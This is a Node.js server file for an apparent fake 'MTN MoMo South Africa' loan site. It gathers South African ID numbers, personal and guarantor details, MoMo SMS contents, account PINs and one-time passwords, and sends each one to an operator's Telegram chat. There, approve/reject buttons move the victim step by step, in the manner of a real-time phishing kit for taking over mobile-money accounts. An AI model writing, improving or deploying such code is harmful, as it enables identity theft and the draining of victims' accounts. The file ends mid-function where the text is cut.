// ============================================================
// server.js – MTN MoMo South Africa
// Registration mandatory · Account-type limits · Guarantor
// ============================================================
'use strict';

require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

console.log('═══════════════════════════════════════');
console.log('🚀 Server starting...');
console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '... (len ' + BOT_TOKEN.length + ')' : 'MISSING');
console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
console.log('═══════════════════════════════════════');

// ─── Account Types ───
const ACCOUNT_TYPES = {
    yello: {
        name: 'MoMo Yello', icon: '🟡',
        dailyCash: 3500, monthlyCap: 20000,
        maxLoan: 20000, minLoan: 5000, requiresId: true,
        description: 'Standard MoMo account'
    },
    yello_plus: {
        name: 'MoMo Yello Plus', icon: '⭐',
        dailyCash: 10000, monthlyCap: 40000,
        maxLoan: 40000, minLoan: 5000, requiresId: true,
        description: 'Higher limits account'
    },
    eazi: {
        name: 'MoMo Eazi', icon: '⚡',
        dailyCash: 2000, monthlyCap: 10000,
        maxLoan: 10000, minLoan: 5000, requiresId: false,
        description: 'Basic MoMo account (no ID required)'
    }
};

// ─── Data Store ───
const applications = {};
const registrations = {};
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
const REG_FILE = path.join(DATA_DIR, 'registrations.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function saveApps() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({
            applications,
            timestamp: new Date().toISOString()
        }, null, 2));
    } catch (e) { console.error('Save error:', e.message); }
}
function saveRegs() {
    try {
        fs.writeFileSync(REG_FILE, JSON.stringify({
            registrations,
            timestamp: new Date().toISOString()
        }, null, 2));
    } catch (e) { console.error('Save regs error:', e.message); }
}
function loadAll() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < 30 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
            }
        }
        if (fs.existsSync(REG_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(REG_FILE, 'utf8'));
            Object.assign(registrations, parsed.registrations || {});
            console.log(`📂 Loaded ${Object.keys(registrations).length} registrations`);
        }
    } catch (e) { console.error('Load error:', e.message); }
}

// ─── Audit ───
function audit(event, data = {}) {
    const entry = { ts: new Date().toISOString(), event, ...data };
    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); }
    catch (e) {}
    console.log(JSON.stringify(entry));
}

// ─── Helpers ───
function esc(t) {
    if (t === null || t === undefined) return '';
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function code(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<code>${esc(c)}</code>`;
}
function block(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<pre>${esc(c)}</pre>`;
}
function fmt(n) { return (Number(n) || 0).toLocaleString(); }
function monthlyRepayment(principal, months) {
    if (!principal || !months) return 0;
    return Math.ceil(principal / months);
}

// ─── SA ID Validation ───
function validateSAID(id) {
    if (!id) return { ok: false, reason: 'ID number is required.' };
    const clean = String(id).replace(/\s/g, '');
    if (!/^\d{13}$/.test(clean)) return { ok: false, reason: 'SA ID must be 13 digits.' };

    const yy = parseInt(clean.substring(0, 2));
    const mm = parseInt(clean.substring(2, 4));
    const dd = parseInt(clean.substring(4, 6));
    const century = yy < 30 ? 2000 : 1900;
    const year = century + yy;

    const dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
        return { ok: false, reason: 'Invalid date of birth in ID.' };
    }

    const now = new Date();
    let age = now.getFullYear() - year;
    const m = now.getMonth() - (mm - 1);
    if (m < 0 || (m === 0 && now.getDate() < dd)) age--;
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };

    let sum = 0, alt = false;
    for (let i = clean.length - 1; i >= 0; i--) {
        let n = parseInt(clean[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
        alt = !alt;
    }
    if (sum % 10 !== 0) return { ok: false, reason: 'Invalid ID checksum.' };

    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    const citizenship = clean[10] === '0' ? 'SA Citizen' : 'Permanent Resident';

    return { ok: true, age, gender, citizenship, dob: dob.toISOString().split('T')[0], idNumber: clean };
}

// ─── Telegram ───
async function tgSend(text, buttons = null) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };

    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ TG sent (${result.result?.message_id})`);
        else console.error(`❌ TG: ${result.description}`);
        return result;
    } catch (e) {
        console.error('❌ TG error:', e.message);
        return { ok: false };
    }
}

function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NO',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    tgSend(text, buttons);
}

// ═══════════════════════════════════════════════════════════
// DIAGNOSTICS
// ═══════════════════════════════════════════════════════════
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), applications: Object.keys(applications).length });
});

app.get('/api/telegram-debug', async (req, res) => {
    const result = {
        tokenSet: !!BOT_TOKEN,
        tokenLength: BOT_TOKEN ? BOT_TOKEN.length : 0,
        tokenHasColon: BOT_TOKEN ? BOT_TOKEN.includes(':') : false,
        chatIdSet: !!CHAT_ID,
        chatId: CHAT_ID || 'MISSING'
    };
    try {
        const me = await fetch(`${TG_API}/getMe`);
        result.getMe = await me.json();
    } catch (e) { result.getMeError = e.message; }
    try { result.testSend = await tgSend(`🧪 <b>Test</b>`); } catch (e) { result.testSendError = e.message; }
    res.json(result);
});

app.get('/api/account-types', (req, res) => {
    res.json({ ok: true, types: ACCOUNT_TYPES });
});

// ═══════════════════════════════════════════════════════════
// TEMPORARY REGISTRATION ENDPOINT (forwards to Telegram)
// ═══════════════════════════════════════════════════════════
app.post('/api/register-momo-telegram', async (req, res) => {
    try {
        const { applicationId, idNumber, accountType, phone, fullName, extra } = req.body || {};

        if (!idNumber || !accountType) {
            return res.status(400).json({ ok: false, error: 'Missing ID or account type.' });
        }
        if (!ACCOUNT_TYPES[accountType]) {
            return res.status(400).json({ ok: false, error: 'Invalid account type.' });
        }

        const type = ACCOUNT_TYPES[accountType];
        const idCheck = type.requiresId ? validateSAID(idNumber) : { ok: true };
        if (!idCheck.ok) {
            return res.status(400).json({ ok: false, error: idCheck.reason });
        }

        const regId = applicationId || ('REG-' + Date.now().toString().slice(-6));
        registrations[regId] = {
            regId,
            idNumber: type.requiresId ? idNumber : null,
            accountType,
            accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            phone: phone || null,
            fullName: fullName || null,
            idDetails: idCheck.ok && type.requiresId ? {
                age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob
            } : null,
            extra: extra || null,
            registeredAt: new Date().toISOString(),
            source: 'register-momo-telegram'
        };
        saveRegs();

        console.log(`📱 Registration via temp endpoint: ${regId} → ${type.name}`);
        audit('registration_temp_endpoint', { regId, accountType, phone });

        await tgSend(
            `📱 <b>NEW MOMO REGISTRATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 Reg ID: ${code(regId)}\n` +
            (applicationId ? `🔗 App ID: ${code(applicationId)}\n` : '') +
            (fullName ? `👤 ${esc(fullName)}\n` : '') +
            (phone ? `📞 ${code('+27' + phone)}\n` : '') +
            `\n<b>💳 ACCOUNT</b>\n` +
            `${type.icon} <b>${type.name}</b>\n` +
            `${esc(type.description)}\n\n` +
            `<b>📊 LIMITS</b>\n` +
            `Daily cash: <b>R ${fmt(type.dailyCash)}</b>\n` +
            `Monthly cap: <b>R ${fmt(type.monthlyCap)}</b>\n` +
            `Max loan: <b>R ${fmt(type.maxLoan)}</b>\n` +
            (idCheck.ok && type.requiresId
                ? `\n<b>🇿🇦 ID DETAILS</b>\n` +
                  `ID: ${code(idNumber)}\n` +
                  `Age: ${idCheck.age} · ${idCheck.gender}\n` +
                  `Citizenship: ${idCheck.citizenship}\n` +
                  `DOB: ${idCheck.dob}\n`
                : '') +
            `\n✅ Registration captured`
        );

        res.json({
            ok: true,
            regId,
            accountType,
            accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan,
            minLoan: type.minLoan,
            message: `${type.name} registered. Your maximum loan is R ${fmt(type.maxLoan)}.`
        });
    } catch (e) {
        console.error('Temp reg error:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ═══════════════════════════════════════════════════════════
// MAIN REGISTRATION ENDPOINT
// ═══════════════════════════════════════════════════════════
app.post('/api/register-momo', async (req, res) => {
    try {
        const { applicationId, idNumber, accountType, phone, fullName } = req.body || {};

        if (!applicationId || !idNumber || !accountType) {
            return res.status(400).json({ ok: false, error: 'Missing required fields.' });
        }
        if (!ACCOUNT_TYPES[accountType]) {
            return res.status(400).json({ ok: false, error: 'Invalid account type.' });
        }

        const type = ACCOUNT_TYPES[accountType];
        let idCheck = { ok: true };
        if (type.requiresId) {
            idCheck = validateSAID(idNumber);
            if (!idCheck.ok) {
                return res.status(400).json({ ok: false, error: idCheck.reason });
            }
        }

        if (!applications[applicationId]) {
            applications[applicationId] = {
                applicationId,
                createdAt: new Date().toISOString()
            };
        }

        applications[applicationId].momoRegistration = {
            idNumber: type.requiresId ? idNumber : null,
            accountType,
            accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan,
            minLoan: type.minLoan,
            phone: phone || null,
            fullName: fullName || null,
            idDetails: idCheck.ok && type.requiresId ? {
                age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob
            } : null,
            registeredAt: new Date().toISOString()
        };
        applications[applicationId].isRegistered = true;
        applications[applicationId].accountType = accountType;
        applications[applicationId].accountMaxLoan = type.maxLoan;
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApps();

        console.log(`✅ MoMo registration: ${applicationId} → ${type.name}`);
        audit('registration_main', { applicationId, accountType, phone });

        await tgSend(
            `📱 <b>MOMO REGISTRATION CONFIRMED</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 App ID: ${code(applicationId)}\n` +
            (fullName ? `👤 ${esc(fullName)}\n` : '') +
            (phone ? `📞 ${code('+27' + phone)}\n` : '') +
            `\n<b>💳 ACCOUNT</b>\n` +
            `${type.icon} <b>${type.name}</b>\n\n` +
            `<b>📊 LIMITS</b>\n` +
            `Daily: R ${fmt(type.dailyCash)}\n` +
            `Monthly: R ${fmt(type.monthlyCap)}\n` +
            `Max Loan: <b>R ${fmt(type.maxLoan)}</b>\n` +
            (idCheck.ok && type.requiresId
                ? `\n<b>🇿🇦 ID</b>\n${code(idNumber)}\nAge ${idCheck.age} · ${idCheck.gender} · ${idCheck.citizenship}\n`
                : '') +
            `\n✅ User can now apply`
        );

        res.json({
            ok: true,
            accountType,
            accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan,
            minLoan: type.minLoan,
            message: `${type.name} registered successfully.`
        });
    } catch (e) {
        console.error('Registration error:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    res.status(200).send('ok');
    console.log('🔔 WEBHOOK:', new Date().toISOString());

    try {
        if (req.body && req.body.callback_query) {
            const q = req.body.callback_query;
            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
            }).catch(() => {});

            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) return;

                const step = data.s;
                const approved = data.a === 'Y';
                if (app_[step] !== 'pending') return;

                app_[step] = approved ? 'approved' : 'rejected';
                app_.updatedAt = new Date().toISOString();
                if (step === 'qualification') {
                    app_.qualification = approved ? 'qualified' : 'unqualified';
                }
                saveApps();
                audit('admin_decision', { id: data.id, step, decision: approved ? 'approved' : 'rejected' });

                tgSend(
                    `${approved ? '✅' : '❌'} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
                    `🆔 ${code(data.id)}\n📋 ${step.toUpperCase()}\n` +
                    `👤 ${esc(app_.firstName || '')} ${esc(app_.lastName || '')}`
                );
            } catch (e) { console.error('Callback parse:', e.message); }
            return;
        }

        if (req.body && req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id.toString();
            if (chatId !== CHAT_ID.toString()) return;

            if (text === '/start' || text === '/help') {
                tgSend(
                    `🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📊 /stats\n📋 /list\n🔍 /search [ID]\n⏳ /pending\n📱 /registrations`
                );
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const regs = Object.keys(registrations).length;
                const pending = Object.values(applications).filter(a =>
                    a.application === 'pending' || a.sms === 'pending' ||
                    a.pin === 'pending' || a.otp === 'pending' || a.qualification === 'pending'
                ).length;
                const completed = Object.values(applications).filter(a => a.qualification === 'qualified').length;
                tgSend(`📊 <b>STATS</b>\n📝 Apps: <b>${total}</b>\n📱 Registrations: <b>${regs}</b>\n⏳ Pending: ${pending}\n✅ Completed: ${completed}`);
            } else if (text === '/registrations') {
                const ids = Object.keys(registrations).slice(-10);
                if (!ids.length) { tgSend('📭 No registrations.'); return; }
                let msg = '📱 <b>RECENT REGISTRATIONS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                ids.forEach(id => {
                    const r = registrations[id];
                    msg += `\n🆔 ${code(id)}\n💳 ${esc(r.accountName)}\n${r.phone ? `📞 ${code('+27' + r.phone)}\n` : ''}💵 Max loan: <b>R ${fmt(r.limits?.maxLoan)}</b>\n`;
                });
                tgSend(msg);
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(([_, a]) =>
                    a.application === 'pending' || a.sms === 'pending' ||
                    a.pin === 'pending' || a.otp === 'pending' || a.qualification === 'pending'
                );
                if (!pending.length) { tgSend('✅ No pending.'); return; }
                let msg = `⏳ <b>PENDING (${pending.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
                pending.slice(0, 10).forEach(([id, a]) => {
                    const steps = [];
                    if (a.application === 'pending') steps.push('App');
                    if (a.sms === 'pending') steps.push('SMS');
                    if (a.pin === 'pending') steps.push('PIN');
                    if (a.otp === 'pending') steps.push('OTP');
                    if (a.qualification === 'pending') steps.push('Qual');
                    msg += `\n🆔 ${code(id)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n💰 R ${fmt(a.loanAmount)}\n📋 ${steps.join(', ')}\n`;
                });
                tgSend(msg);
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 No applications.'); return; }
                let msg = '📋 <b>LAST 10</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += `\n${i+1}. 🆔 ${code(id)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n💰 R ${fmt(a.loanAmount)}\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/search ')) {
                const id = text.replace('/search ', '').trim().toUpperCase();
                const a = applications[id];
                if (!a) { tgSend('❌ Not found'); return; }
                const monthly = monthlyRepayment(a.loanAmount, parseInt(a.loanTerm));
                tgSend(
                    `🔍 <b>DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${code(id)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n` +
                    `📱 ${a.phone ? code('+27' + a.phone) : 'N/A'}\n` +
                    `💳 ${esc(a.momoRegistration?.accountName || 'Not registered')}\n` +
                    `💰 <b>R ${fmt(a.loanAmount)}</b> · Monthly <b>R ${fmt(monthly)}</b>\n` +
                    `🤝 Guarantor: ${esc(a.guarantorName || 'N/A')}\n` +
                    `📋 App:${a.application} SMS:${a.sms} PIN:${a.pin} OTP:${a.otp} Qual:${a.qualification}`
                );
            }
        }
    } catch (e) { console.error('Webhook error:', e.message); }
});

// ═══════════════════════════════════════════════════════════
// LOAN FLOW — APPLICATION SUBMIT (with registration gate)
// ═══════════════════════════════════════════════════════════
app.post('/api/send-application', (req, res) => {
    try {
        const data = req.body.applicationData;
        const {
            applicationId, phone, loanAmount, loanTerm,
            firstName, lastName, email, employment, annualIncome,
            kinName, kinPhone, loanType, loanPurpose,
            guarantorName, guarantorPhone, guarantorRelation,
            accountType, isRegistered
        } = data;

        if (!applicationId) return res.status(400).json({ ok: false, error: 'Missing application ID' });

        // ─── REGISTRATION GATE ───
        const regData = applications[applicationId]?.momoRegistration;
        const isReg = !!(isRegistered && accountType && ACCOUNT_TYPES[accountType]);

        if (!isReg || !regData || !regData.accountType) {
            console.log(`⛔ Blocked unregistered application: ${applicationId}`);
            audit('application_blocked_not_registered', { id: applicationId, phone });
            return res.status(403).json({
                ok: false,
                code: 'NOT_REGISTERED',
                error: 'Invalid user credentials. You must register on MoMo before applying. Please register first.'
            });
        }

        if (accountType !== regData.accountType) {
            console.log(`⛔ Account type mismatch: ${applicationId}`);
            audit('application_blocked_type_mismatch', { id: applicationId });
            return res.status(403).json({
                ok: false,
                code: 'NOT_REGISTERED',
                error: 'Invalid user credentials. Your account type does not match your registration. Please register again.'
            });
        }

        const type = ACCOUNT_TYPES[accountType];

        // Enforce max loan per account type
        if (loanAmount > type.maxLoan) {
            return res.status(400).json({
                ok: false,
                error: `${type.name} allows a maximum loan of R ${fmt(type.maxLoan)}. Please reduce your loan amount.`
            });
        }
        if (loanAmount < type.minLoan) {
            return res.status(400).json({
                ok: false,
                error: `Minimum loan for ${type.name} is R ${fmt(type.minLoan)}.`
            });
        }

        const monthly = monthlyRepayment(loanAmount, parseInt(loanTerm));
        const requiredTx = Math.ceil(loanAmount * 0.20);
        const effectiveRequiredTx = Math.min(requiredTx, type.monthlyCap);

        applications[applicationId] = {
            ...applications[applicationId],
            ...data,
            accountType,
            accountName: type.name,
            accountMaxLoan: type.maxLoan,
            requiredTx: effectiveRequiredTx,
            application: 'pending',
            sms: applications[applicationId]?.sms || 'idle',
            pin: applications[applicationId]?.pin || 'idle',
            otp: applications[applicationId]?.otp || 'idle',
            qualification: applications[applicationId]?.qualification || 'idle',
            monthlyRepayment: monthly,
            createdAt: applications[applicationId]?.createdAt || new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };
        saveApps();
        console.log(`📝 Application submitted: ${applicationId} (${type.name})`);
        audit('application_submitted', { id: applicationId, accountType, loanAmount });

        askApproval(
            `📋 <b>NEW LOAN APPLICATION (SOUTH AFRICA)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>👤 APPLICANT</b>\n` +
            `Name: ${esc(firstName)} ${esc(lastName)}\n` +
            `Phone: ${code('+27' + phone)}\n` +
            `Email: ${esc(email)}\n` +
            `MoMo: <b>${type.icon} ${type.name}</b>\n` +
            `Max loan for account: R ${fmt(type.maxLoan)}\n\n` +
            `<b>💰 LOAN REQUEST</b>\n` +
            `Type: ${esc(loanType)}\n` +
            `Amount: <b>R ${fmt(loanAmount)}</b>\n` +
            `Term: ${esc(loanTerm)}\n` +
            `Monthly Repayment: <b>R ${fmt(monthly)}</b>\n` +
            `Purpose: ${esc(loanPurpose)}\n\n` +
            `<b>📊 QUALIFICATION REQUIREMENT</b>\n` +
            `20% of loan: R ${fmt(requiredTx)}\n` +
            `Account cap: R ${fmt(type.monthlyCap)}\n` +
            `Effective required: <b>R ${fmt(effectiveRequiredTx)}</b>\n\n` +
            `<b>💼 EMPLOYMENT</b>\n` +
            `${esc(employment)} — R ${fmt(annualIncome)}/yr\n\n` +
            `<b>👨‍👩‍👦 NEXT OF KIN</b>\n` +
            `${esc(kinName)} ${code('+27' + kinPhone)}\n\n` +
            `<b>🤝 GUARANTOR</b>\n` +
            `${esc(guarantorName || 'N/A')}\n` +
            `Phone: ${guarantorPhone ? code('+27' + guarantorPhone) : 'N/A'}\n` +
            `Relationship: ${esc(guarantorRelation || 'N/A')}\n\n` +
            `🆔 ID: ${code(applicationId)}\n\n` +
            `✅ <b>Approve to allow SMS step?</b>`,
            'application', applicationId
        );

        res.json({ ok: true, applicationId, status: 'pending' });
    } catch (e) {
        console.error('send-application:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Submit SMS ───
app.post('/api/send-momo-message', (req, res) => {
    try {
        const { applicationId, phone, momoMessage } = req.body.momoData;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.application !== 'approved') return res.status(400).json({ ok: false, error: 'Application not approved yet' });

        app_.smsMessage = String(momoMessage).trim();
        app_.sms = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `📨 <b>SMS VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(applicationId)}\n👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `📱 ${code('+27' + phone)}\n\n` +
            `📩 <b>SMS:</b>\n${block(momoMessage)}\n\n` +
            `✅ <b>Approve to allow PIN step?</b>`,
            'sms', applicationId
        );
        res.json({ ok: true, status: 'pending' });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ─── Submit PIN ───
app.post('/api/send-pin', (req, res) => {
    try {
        const { applicationId, pin } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.sms !== 'approved') return res.status(400).json({ ok: false, error: 'SMS not approved yet' });

        const cleanPin = String(pin || '').trim();
        if (!/^\d{5}$/.test(cleanPin)) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits' });

        app_.pinValue = cleanPin;
        app_.pin = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `🔐 <b>PIN VERIFICATION</b>\n🆔 ${code(applicationId)}\n` +
            `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `🔢 PIN: ${code(cleanPin)}\n\n✅ <b>Approve to allow OTP step?</b>`,
            'pin', applicationId
        );
        res.json({ ok: true, status: 'pending' });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ─── Submit OTP ───
app.post('/api/send-otp', (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.pin !== 'approved') return res.status(400).json({ ok: false, error: 'PIN not approved yet' });

        const cleanOtp = String(otp || '').trim();
        if (!/^\d{4}$/.test(cleanOtp)) return res.status(400).json({ ok: false, error: 'OTP must be 4 digits' });

        app_.otpValue = cleanOtp;
        app_.otp = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `🔑 <b>OTP VERIFICATION</b>\n🆔 ${code(applicationId)}\n` +
            `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `🔢 OTP: ${code(cleanOtp)}\n\n✅ <b>Approve to allow transaction review?</b>`,
            'otp', applicationId
        );
        res.json({ ok: true, status: 'pending' });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ─── Qualification ───
app.post('/api/check-qualification', (req, res) => {
    try {
        const { applicationId } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.otp !== 'approved') return res.status(400).json({ ok: false, error: 'OTP not approved yet' });

        const type = ACCOUNT_TYPES[app_.accountType] || ACCOUNT_TYPES.yello;
        const required = Math.ceil(app_.loanAmount * 0.20);
        const effectiveRequired = Math.min(required, type.monthlyCap);
        const monthly = app_.monthlyRepayment || monthlyRepayment(app_.loanAmount, parseInt(app_.loanTerm));

        app_.qualification = 'pending';
        app_.qualificationRequired = effectiveRequired;
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `📊 <b>TRANSACTION REVIEW</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>👤 APPLICANT</b>\n${esc(app_.firstName)} ${esc(app_.lastName)}\n${code('+27' + app_.phone)}\n` +
            `<b>💳 ACCOUNT</b>\n${type.icon} ${type.name}\n\n` +
            `<b>💰 LOAN</b>\nAmount: <b>R ${fmt(app_.loanAmount)}</b>\n` +
            `Term: ${esc(app_.loanTerm)}\nMonthly: <b>R ${fmt(monthly)}</b>\n\n` +
            `<b>📊 QUALIFICATION</b>\n` +
            `20% of loan: R ${fmt(required)}\n` +
            `Account cap: R ${fmt(type.monthlyCap)}\n` +
            `Effective required: <b>R ${fmt(effectiveRequired)}</b>\n\n` +
            `<b>🤝 GUARANTOR</b>\n${esc(app_.guarantorName || 'N/A')}\n` +
            `${app_.guarantorPhone ? code('+27' + app_.guarantorPhone) : ''}\n` +
            `🆔 ${code(applicationId)}\n\n✅ <b>Approve to complete the loan?</b>`,
            'qualification', applicationId
        );

        res.json({ ok: true, status: 'pending', required: effectiveRequired });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ─── Status ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (!['application', 'sms', 'pin', 'otp', 'qualification'].includes(step))
        return res.status(400).json({ ok: false, error: 'Invalid step' });
    res.json({ ok: true, status: app_[step] || 'idle', applicationId, step });
});

app.get('/api/status/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    res.json({
        ok: true,
        application: app_.application,
        sms: app_.sms, pin: app_.pin, otp: app_.otp,
        qualification: app_.qualification,
        accountType: app_.accountType,
        accountMaxLoan: app_.accountMaxLoan
    });
});

// ─── Resend SMS ───
app.post('/api/resend-sms/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.sms = 'idle'; app_.smsMessage = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

// ─── Resend OTP ───
app.post('/api/resend-otp', (req, res) => {
    const { applicationId } = req.body;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.otp = 'idle'; app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    tgSend(`🔄 <b>OTP RESENT</b>\n🆔 ${code(applicationId)}`);
    res.json({ ok: true });
});

// ─── Retry ───
app.post('/api/retry/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (!['sms', 'pin', 'otp'].includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
    app_[step] = 'idle';
    if (step === 'sms') app_.smsMessage = null;
    if (step === 'pin') app_.pinValue = null;
    if (step === 'otp') app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

// ─── Rejection info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    let rejectedStep = null, errorMessage = '';
    if (app_.application === 'rejected') { rejectedStep = 'application'; errorMessage = 'Application was rejected.'; }
    else if (app_.sms === 'rejected') { rejectedStep = 'sms'; errorMessage = 'Your SMS was rejected.'; }
    else if (app_.pin === 'rejected') { rejectedStep = 'pin'; errorMessage = 'Your PIN was rejected.'; }
    else if (app_.otp === 'rejected') { rejectedStep = 'otp'; errorMessage = 'Your OTP was rejected.'; }
    else if (app_.qualification === 'unqualified') { rejectedStep = 'qualification'; errorMessage = 'Requirements not met.'; }
    res.json({ ok: true, rejectedStep, errorMessage });
});

// ─── SPA fallback ───
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// ─── Boot ───
loadAll();
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`   → http://localhost:${PORT}`);
    console.log(`   → Health: /health`);
